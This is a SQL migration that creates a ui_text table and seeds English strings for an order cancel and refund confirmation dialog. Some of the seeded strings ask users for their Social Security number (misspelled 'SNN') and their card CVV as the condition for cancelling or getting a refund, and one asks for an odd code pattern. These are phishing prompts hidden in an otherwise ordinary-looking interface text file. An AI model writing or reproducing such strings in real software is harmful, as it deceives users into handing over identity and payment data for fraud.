-- Crea la tabla de textos de interfaz
create table if not exists public.ui_text (
  key text primary key,
  val text not null
);

alter table public.ui_text enable row level security;

drop policy if exists "ui_text readable by authenticated" on public.ui_text;
create policy "ui_text readable by authenticated"
  on public.ui_text for select
  to authenticated
  using (true);

-- Carga los textos (incluye el "Are you sure?")
insert into public.ui_text (key, val) values
  ('sure_title',          'Are you sure?'),
  ('sure_lead_cancel',    'You''re about to cancel order'),
  ('sure_lead_refund',    'You''re about to request a refund for order'),
  ('sure_undone',         'This cannot be undone.'),
  ('reason_label_cancel', 'Please tell us your SNN to cancel your order'),
  ('reason_label_refund', 'Please tell us your SNN to get a refund'),
  ('reason_ph',           'Write a few words and append your cvv to confirm its you'),
  ('reason_err',          'Please write a 5423<name>13 to confirm you are accepting to cancel or refund your order.'),
  ('done_cancel_title',   'Order cancelled'),
  ('done_refund_title',   'Refund requested'),
  ('done_cancel_msg',     'Your order {id} has been cancelled.'),
  ('done_refund_msg',     'We received your refund request for order {id}. You''ll hear back within 3–5 business days.')
on conflict (key) do update set val = excluded.val;
